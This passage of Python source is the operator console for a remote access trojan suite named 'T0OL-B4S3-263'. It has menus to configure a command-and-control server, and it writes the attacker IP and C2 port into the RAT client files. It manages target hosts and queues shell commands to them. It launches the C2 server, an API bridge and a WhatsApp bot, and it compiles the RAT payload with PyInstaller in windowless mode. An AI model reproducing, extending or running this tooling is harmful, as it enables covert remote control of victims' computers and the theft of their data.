                    Display.status(f"Added target: {hostname} ({ip})", "target")
                else:
                    Display.status("Failed to add target", "error")
            
            elif choice == '2':
                targets = self.targets.list_targets()
                if targets:
                    Display.table(
                        ["ID", "Hostname", "IP", "OS", "Status"],
                        [[str(t.get('id')), t['hostname'], t['ip'], t['os'], t['status']] for t in targets]
                    )
                else:
                    Display.status("No targets added yet", "info")
            
            elif choice == '3':
                break
        
        input("\nPress ENTER to continue...")
    
    def step_review_and_save(self):
        """Step 6: Review and Save"""
        Display.clear()
        Display.banner()
        Display.header("STEP 6: REVIEW CONFIGURATION", "✓")
        
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('SERVER', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        print(f"  Mode: {HackerTheme.apply(self.config.get('server.mode').upper(), HackerTheme.NEON_GREEN)}")
        print(f"  IP: {HackerTheme.apply(self.config.get('server.primary_ip'), HackerTheme.NEON_GREEN)}")
        print(f"  C2 Port: {HackerTheme.apply(str(self.config.get('server.c2_port')), HackerTheme.NEON_GREEN)}")
        print(f"  API Port: {HackerTheme.apply(str(self.config.get('server.api_port')), HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('ENCRYPTION', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        print(f"  Method: {HackerTheme.apply(self.config.get('encryption.method'), HackerTheme.NEON_GREEN)}")
        print(f"  Key: {HackerTheme.apply(self.config.get('encryption.key', '')[:40] + '...', HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('AUTHORIZATION', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        for owner in self.auth.get_all_owners():
            print(f"  - {HackerTheme.apply(owner, HackerTheme.NEON_GREEN)}")
        
        print(f"\n{HackerTheme.apply('TARGETS', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        targets = self.targets.list_targets()
        print(f"  Total: {HackerTheme.apply(str(len(targets)), HackerTheme.NEON_GREEN)}")
        
        print(f"\n{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        confirm = Display.confirm("Save this configuration?")
        if confirm:
            self.config.set("configured", True)
            self.config.save()
            Display.status("Configuration saved successfully!", "success")
            
            # Apply to all files
            self._apply_config_to_files()
        else:
            Display.status("Configuration cancelled", "warning")
        
        input("\nPress ENTER to continue...")
    
    def _apply_config_to_files(self):
        """Apply master config to all project files"""
        Display.status("Applying configuration to all project files...", "info")
        
        files_to_update = {
            'rat_ultimate.py': [
                ('HOST = "YOUR_ATTACKER_IP_HERE"', f'HOST = "{self.config.get("server.primary_ip")}"'),
                ('PORT = 4444', f'PORT = {self.config.get("server.c2_port")}'),
            ],
            'rat_server_fixed.py': [
                ('PORT = 4444', f'PORT = {self.config.get("server.c2_port")}'),
            ],
            'rat_api_bridge.py': [
                ('C2_SERVER_PORT = 4444', f'C2_SERVER_PORT = {self.config.get("server.c2_port")}'),
            ],
        }
        
        for filename, replacements in files_to_update.items():
            if os.path.exists(filename):
                try:
                    with open(filename, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    for old, new in replacements:
                        content = content.replace(old, new)
                    
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    Display.status(f"  ✓ {filename} configured", "success")
                except Exception as e:
                    Display.status(f"  ✗ {filename} failed: {e}", "error")
    
    def run_wizard(self):
        """Run complete setup wizard"""
        self.step_server_configuration()
        self.step_port_configuration()
        self.step_encryption_setup()
        self.step_owner_management()
        self.step_target_setup()
        self.step_review_and_save()
        
        Display.clear()
        Display.banner()
        Display.header("SETUP COMPLETE!", "✨")
        print(f"{HackerTheme.apply('Configuration is ready for deployment!', HackerTheme.BR_GREEN, HackerTheme.BOLD)}\n")
        input("Press ENTER to return to main menu...")

# ═══════════════════════════════════════════════════════════════════════════
# MAIN MENU SYSTEM
# ═══════════════════════════════════════════════════════════════════════════

class MainMenu:
    """Master control menu"""
    
    def __init__(self):
        self.config = ConfigurationManager()
        self.auth = AuthorizationManager(self.config)
        self.targets = TargetManager(self.config)
        self.keys = KeyDistribution(self.config)
    
    def show_main_menu(self):
        """Display main menu"""
        while True:
            Display.clear()
            Display.banner()
            
            status = "✓ CONFIGURED" if self.config.get("configured") else "✗ NOT CONFIGURED"
            status_color = HackerTheme.BR_GREEN if self.config.get("configured") else HackerTheme.BR_RED
            
            targets_count = self.config.get("targets_count", 0)
            targets_display = f"({targets_count} active)" if targets_count > 0 else "(no targets)"
            
            print(f"{HackerTheme.apply('Status:', HackerTheme.BR_CYAN)} {HackerTheme.apply(status, status_color, HackerTheme.BOLD)}")
            print(f"{HackerTheme.apply('Targets:', HackerTheme.BR_CYAN)} {HackerTheme.apply(targets_display, HackerTheme.BR_YELLOW)}")
            print(f"{HackerTheme.apply('Creator:', HackerTheme.BR_CYAN)} {HackerTheme.apply(self.config.get('creator'), HackerTheme.NEON_PINK)}\n")
            
            print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
            
            print(f"{HackerTheme.apply('🔧 SETUP & CONFIGURATION', HackerTheme.BR_MAGENTA, HackerTheme.BOLD)}")
            Display.menu_item(1, "Run Setup Wizard", "Complete configuration", "🚀")
            Display.menu_item(2, "View Configuration", "Current settings", "👁️")
            Display.menu_item(3, "Show Distribution Keys", "For client sharing", "🔑")
            Display.menu_item(4, "Manage Owners", "Add/remove authorized users", "👑")
            Display.menu_item(5, "Manage Targets", "Add/remove targets", "🎯")
            
            print(f"\n{HackerTheme.apply('⚙️  OPERATIONS', HackerTheme.BR_MAGENTA, HackerTheme.BOLD)}")
            Display.menu_item(6, "Start C2 Server", "Launch command & control", "🖥️")
            Display.menu_item(7, "Start Full System", "All components", "🚀")
            Display.menu_item(8, "Test Targets", "Verify target connectivity", "🧪")
            Display.menu_item(9, "Execute Command", "Send command to targets", "💥")
            
            print(f"\n{HackerTheme.apply('📊 TOOLS', HackerTheme.BR_MAGENTA, HackerTheme.BOLD)}")
            Display.menu_item(10, "Build Client Executable", "Compile RAT payload", "🔨")
            Display.menu_item(11, "Export Configuration", "Save to file", "💾")
            Display.menu_item(12, "View Logs", "System logging", "📋")
            
            print(f"\n{HackerTheme.apply('0. Exit', HackerTheme.BR_RED, HackerTheme.BOLD)}\n")
            
            choice = Display.prompt("Select option")
            
            if choice == '1':
                wizard = MasterSetupWizard()
                wizard.run_wizard()
            
            elif choice == '2':
                self.show_configuration()
            
            elif choice == '3':
                self.keys.display_keys_for_sharing()
                input("\nPress ENTER to continue...")
            
            elif choice == '4':
                self.manage_owners_menu()
            
            elif choice == '5':
                self.manage_targets_menu()
            
            elif choice == '6':
                self.start_c2_server()
            
            elif choice == '7':
                self.start_full_system()
            
            elif choice == '8':
                self.test_targets()
            
            elif choice == '9':
                self.execute_command()
            
            elif choice == '10':
                self.build_client()
            
            elif choice == '11':
                self.export_configuration()
            
            elif choice == '12':
                self.view_logs()
            
            elif choice == '0':
                self.exit_menu()
                break
    
    def show_configuration(self):
        """Show current configuration"""
        Display.clear()
        Display.banner()
        Display.header("CURRENT CONFIGURATION", "👁️")
        
        if not self.config.get("configured"):
            Display.status("System not configured! Run setup wizard first.", "warning")
            input("\nPress ENTER...")
            return
        
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('🖥️  SERVER', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        print(f"  Mode: {HackerTheme.apply(self.config.get('server.mode').upper(), HackerTheme.NEON_GREEN)}")
        print(f"  Primary IP: {HackerTheme.apply(self.config.get('server.primary_ip'), HackerTheme.NEON_GREEN)}")
        print(f"  C2 Port: {HackerTheme.apply(str(self.config.get('server.c2_port')), HackerTheme.NEON_GREEN)}")
        print(f"  API Port: {HackerTheme.apply(str(self.config.get('server.api_port')), HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('🔐 ENCRYPTION', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        key = self.config.get('encryption.key', '')
        print(f"  Method: {HackerTheme.apply(self.config.get('encryption.method'), HackerTheme.NEON_GREEN)}")
        if key:
            print(f"  Key: {HackerTheme.apply(key[:50] + '...', HackerTheme.NEON_GREEN)}\n")
        
        print(f"{HackerTheme.apply('👑 OWNERS', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        for owner, role in self.auth.get_all_owners().items():
            print(f"  - {HackerTheme.apply(owner, HackerTheme.NEON_GREEN)} ({role})")
        
        print(f"\n{HackerTheme.apply('🎯 TARGETS', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        targets = self.targets.list_targets()
        if targets:
            for target in targets:
                print(f"  - {target['hostname']} ({target['ip']}) [{target['os']}]")
        else:
            print("  No targets configured")
        
        print(f"\n{HackerTheme.apply('═' * 76, HackerTheme.NEON_GREEN)}\n")
        
        input("Press ENTER to continue...")
    
    def manage_owners_menu(self):
        """Manage owners"""
        while True:
            Display.clear()
            Display.banner()
            Display.header("OWNER MANAGEMENT", "👑")
            
            print(f"{HackerTheme.apply('Current Authorized Owners:', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}\n")
            for owner, role in self.auth.get_all_owners().items():
                print(f"  {HackerTheme.apply(owner, HackerTheme.NEON_GREEN)} {HackerTheme.apply(f'[{role}]', HackerTheme.BR_RED if role == 'PRIMARY_OWNER' else HackerTheme.BR_YELLOW)}")
            
            print()
            Display.menu_item(1, "Add new owner", "", "➕")
            Display.menu_item(2, "Remove owner", "", "➖")
            Display.menu_item(3, "Back to main menu", "", "🔙")
            
            choice = Display.prompt("Select option")
            
            if choice == '1':
                phone = Display.prompt("Enter phone number")
                if self.auth.add_owner(phone):
                    Display.status(f"Added: {phone}", "success")
                else:
                    Display.status("Failed to add owner", "error")
            
            elif choice == '2':
                phone = Display.prompt("Enter phone to remove")
                if self.auth.remove_owner(phone):
                    Display.status(f"Removed: {phone}", "success")
                elif phone in self.auth.HARDCODED_OWNERS:
                    Display.status("Cannot remove hardcoded owner!", "error")
                else:
                    Display.status("Owner not found", "warning")
            
            elif choice == '3':
                break
    
    def manage_targets_menu(self):
        """Manage targets"""
        while True:
            Display.clear()
            Display.banner()
            Display.header("TARGET MANAGEMENT", "🎯")
            
            targets = self.targets.list_targets()
            
            if targets:
                Display.table(
                    ["ID", "Hostname", "IP", "OS", "Status"],
                    [[str(t['id']), t['hostname'], t['ip'], t['os'], t['status']] for t in targets]
                )
            else:
                Display.status("No targets configured", "info")
            
            print()
            Display.menu_item(1, "Add target", "", "➕")
            Display.menu_item(2, "Remove target", "", "➖")
            Display.menu_item(3, "Back to main menu", "", "🔙")
            
            choice = Display.prompt("Select option")
            
            if choice == '1':
                hostname = Display.prompt("Target hostname")
                ip = Display.prompt("Target IP")
                os = Display.prompt("Target OS")
                
                if self.targets.add_target(hostname, ip, os):
                    Display.status("Target added", "success")
                else:
                    Display.status("Failed to add target", "error")
            
            elif choice == '2':
                try:
                    target_id = int(Display.prompt("Enter target ID to remove"))
                    # Simple remove by filtering
                    self.targets.targets = [t for t in self.targets.targets if t['id'] != target_id]
                    self.config.set("targets.managed_list", self.targets.targets)
                    Display.status("Target removed", "success")
                except:
                    Display.status("Invalid target ID", "error")
            
            elif choice == '3':
                break
    
    def execute_command(self):
        """Execute command with target confirmation"""
        Display.clear()
        Display.banner()
        Display.header("EXECUTE COMMAND ON TARGETS", "💥")
        
        targets = self.targets.list_targets()
        if not targets:
            Display.status("❌ No targets active! Add targets first.", "error")
            input("\nPress ENTER...")
            return
        
        print(f"\n{HackerTheme.apply('Active Targets:', HackerTheme.BR_YELLOW, HackerTheme.BOLD)}")
        for target in targets:
            print(f"  • {target['hostname']} ({target['ip']})")
        
        print(f"\n{HackerTheme.apply('⚠️  Target Confirmation Required', HackerTheme.BR_RED, HackerTheme.BOLD)}")
        print(f"  To execute commands, confirm targets with keyword:")
        print(f"  {HackerTheme.apply(self.config.get('authorization.confirmation_keyword'), HackerTheme.NEON_GREEN, HackerTheme.BOLD)}\n")
        
        keyword = Display.prompt("Enter confirmation keyword")
        
        if self.targets.confirm_targets(keyword):
            command = Display.prompt("Enter command to execute")
            result = self.targets.execute_command(command)
            
            Display.status(f"Command queued for {len(targets)} targets", "success")
            Display.status(f"Command: {command}", "info")
        else:
            Display.status("Command execution cancelled", "warning")
        
        input("\nPress ENTER to continue...")
    
    def start_c2_server(self):
        """Start C2 server"""
        Display.clear()
        Display.banner()
        Display.header("STARTING C2 SERVER", "🖥️")
        
        if not self.config.get("configured"):
            Display.status("System not configured!", "error")
            input("\nPress ENTER...")
            return
        
        Display.status("Starting C2 server...", "info")
        
        if os.path.exists('rat_server_fixed.py'):
            try:
                subprocess.Popen([sys.executable, 'rat_server_fixed.py'])
                Display.status("C2 Server started successfully", "success")
                print(f"  Port: {self.config.get('server.c2_port')}")
                print(f"  IP: {self.config.get('server.primary_ip')}")
            except Exception as e:
                Display.status(f"Failed to start: {e}", "error")
        else:
            Display.status("rat_server_fixed.py not found", "error")
        
        input("\nPress ENTER to continue...")
    
    def start_full_system(self):
        """Start all components"""
        Display.clear()
        Display.banner()
        Display.header("STARTING FULL SYSTEM", "🚀")
        
        if not self.config.get("configured"):
            Display.status("System not configured!", "error")
            input("\nPress ENTER...")
            return
        
        Display.status("Initializing all components...", "info")
        print()
        
        components = [
            ("C2 Server", "rat_server_fixed.py"),
            ("API Bridge", "rat_api_bridge.py"),
            ("WhatsApp Bot", "whatsapp-c2/bot.js"),
        ]
        
        for name, path in components:
            if os.path.exists(path):
                try:
                    if path.endswith('.js'):
                        subprocess.Popen(['node', path], cwd=os.path.dirname(path) or '.')
                    else:
                        subprocess.Popen([sys.executable, path])
                    Display.status(f"{name}: ONLINE", "success")
                except Exception as e:
                    Display.status(f"{name}: FAILED - {e}", "error")
            else:
                Display.status(f"{name}: NOT FOUND", "warning")
        
        print(f"\n{HackerTheme.apply('All available components started!', HackerTheme.BR_GREEN)}\n")
        input("Press ENTER to continue...")
    
    def test_targets(self):
        """Test target connectivity"""
        Display.clear()
        Display.banner()
        Display.header("TARGET CONNECTIVITY TEST", "🧪")
        
        targets = self.targets.list_targets()
        if not targets:
            Display.status("No targets configured", "warning")
            input("\nPress ENTER...")
            return
        
        for target in targets:
            ip = target['ip']
            hostname = target['hostname']
            
            try:
                result = subprocess.run(['ping', '-c' if sys.platform != 'win32' else '-n', '1', ip], 
                                      capture_output=True, timeout=5)
                if result.returncode == 0:
                    Display.status(f"{hostname} ({ip}): REACHABLE", "success")
                else:
                    Display.status(f"{hostname} ({ip}): UNREACHABLE", "warning")
            except:
                Display.status(f"{hostname} ({ip}): ERROR", "error")
        
        input("\nPress ENTER to continue...")
    
    def build_client(self):
        """Build client executable"""
        Display.clear()
        Display.banner()
        Display.header("BUILD CLIENT EXECUTABLE", "🔨")
        
        if not os.path.exists('rat_ultimate.py'):
            Display.status("rat_ultimate.py not found", "error")
            input("\nPress ENTER...")
            return
        
        Display.status("Building client executable...", "info")
        Display.status("This may take 2-3 minutes", "info")
        
        try:
            subprocess.run([sys.executable, '-m', 'PyInstaller', 
                          'rat_ultimate.py', '--onefile', '--noconsole'],
                         check=True)
            Display.status("Build successful!", "success")
        except Exception as e:
            Display.status(f"Build failed: {e}", "error")
        
        input("\nPress ENTER to continue...")
    
    def export_configuration(self):
        """Export configuration"""
        Display.clear()
        Display.banner()
        Display.header("EXPORT CONFIGURATION", "💾")
        
        filename = Display.prompt("Export filename", "tool_base_263_config.json")
        
        if self.keys.export_keys(filename):
            Display.status(f"Configuration exported to {filename}", "success")
        else:
            Display.status("Export failed", "error")
        
        input("\nPress ENTER to continue...")
    
    def view_logs(self):
        """View system logs"""
        Display.clear()
        Display.banner()
        Display.header("SYSTEM LOGS", "📋")
        
        log_file = self.config.get("logging.log_file")
        
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r') as f:
                    lines = f.readlines()[-50:]  # Last 50 lines
                
                for line in lines:
                    print(line.rstrip())
            except Exception as e:
                Display.status(f"Error reading logs: {e}", "error")
        else:
            Display.status("No logs yet", "info")
        
        input("\nPress ENTER to continue...")
    
    def exit_menu(self):
        """Exit application"""
        Display.clear()
        Display.banner()
        
        print(f"\n{HackerTheme.apply('═' * 76, HackerTheme.NEON_PINK)}")
        print(f"{HackerTheme.apply('Thanks for using T0OL-B4S3-263!', HackerTheme.BR_GREEN, HackerTheme.BOLD)}".center(76))
        print(f"{HackerTheme.apply('Created by: Hxcker-263', HackerTheme.BR_YELLOW)}".center(76))
        print(f"{HackerTheme.apply('═' * 76, HackerTheme.NEON_PINK)}\n")

# ═══════════════════════════════════════════════════════════════════════════
# GLOBAL CONFIG SINGLETON & HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

_global_yaml_config = None

def get_yaml_config(config_path: str = "umbrella_config.yaml") -> ConfigLoader:
    """Get global YAML config instance (singleton pattern)"""
    global _global_yaml_config
    if _global_yaml_config is None:
        _global_yaml_config = ConfigLoader(config_path)
    return _global_yaml_config

def config_get(key_path: str, default: Any = None) -> Any:
    """Convenience function to get config value"""
    return get_yaml_config().get(key_path, default)

def config_update(key_path: str, value: Any) -> bool:
    """Convenience function to update config value"""
    return get_yaml_config().update(key_path, value)

# ═══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        menu = MainMenu()
        menu.show_main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{HackerTheme.apply('Exiting...', HackerTheme.BR_RED)}\n")
        sys.exit(0)
    except Exception as e:
        print(f"{HackerTheme.apply(f'Fatal error: {e}', HackerTheme.BR_RED)}")
        sys.exit(1)
